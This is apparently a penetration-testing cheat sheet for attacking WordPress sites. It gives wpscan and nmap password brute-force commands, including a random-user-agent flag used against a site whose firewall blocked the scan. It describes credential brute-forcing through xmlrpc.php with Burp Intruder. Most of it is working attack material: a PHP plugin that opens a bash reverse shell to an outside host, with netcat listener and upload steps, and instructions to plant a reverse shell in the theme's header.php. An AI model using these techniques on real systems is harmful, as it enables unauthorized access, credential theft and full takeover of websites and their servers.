# Wordpress

## WPScan - Wordpress Security Scanner
```
wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlist/rockyou.txt --usernames admin
wpscan --url http://10.0.0.1/ --api-token [token]
wpscan --url http://10.0.0.1/ --api-token [token] -enumerate
```

## Wordpress user enumeration

#### Using NMAP
```
nmap --script "http-wordpress-brute.nse" 10.0.0.1
```

#### Using WPSCAN
```
wpscan --url http://10.0.0.1 --passwords /usr/share/wordlists/rockyou.txt --usernames admin

➤ Scan Aborted: The target is responding with a 403, this might be due to a WAF.
wpscan --url https://10.0.0.1/ --random-user-agent   
```

#### Using xlmrpc.php and burp
```
➤ 1. Check if the xlmrpc is available
http://10.0.0.1/xmlrpc.php
output : XML-RPC server accepts POST requests only

➤ 2. Using Burp, intercept the request

➤ 3. Modify the request
• Change GET by POST
• Add the list method in order to list all the method

POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>

➤ 4. Modify the request and try to verify a login/password
• Change the method GET By POST
• Add the parameters

POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>

➤ 5. Send it in the intruder

➤ 6. Add a payload only on the password

➤ 7. Add the wordlist

➤ 8. Execute
The valid credentials will generate a different length size.
```

## Reverse shell using crafted wordpress plugin

#### 1. Create the reverse shell plugin
```
<?php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Lexis
* Author URI: http://www.lexis.com
*/

exec("bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>1&'");
?>
```

#### 2. Zip it
```
zip reverse-shell-plugin.zip reverse-shell-plugin.php
```
#### 3. Create a listener
```
nc -lvp 443
```

#### 4. Upload the malicious plugin
```
Go to plugins > add new > upload plugin
Click on 'Browse'
Click on 'Install now'
Click on 'Activate plugin'
```

## Reverse shell using the header.php
```
➤ 1. Open the theme editor

➤ 2. Select the header.php (or footer.php)

➤ 3. Add the reverse shell inside the page
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

➤ 4. Update the header.php

➤ 5. open a listener
nc -nvlp 443

➤ Browse the website again
```
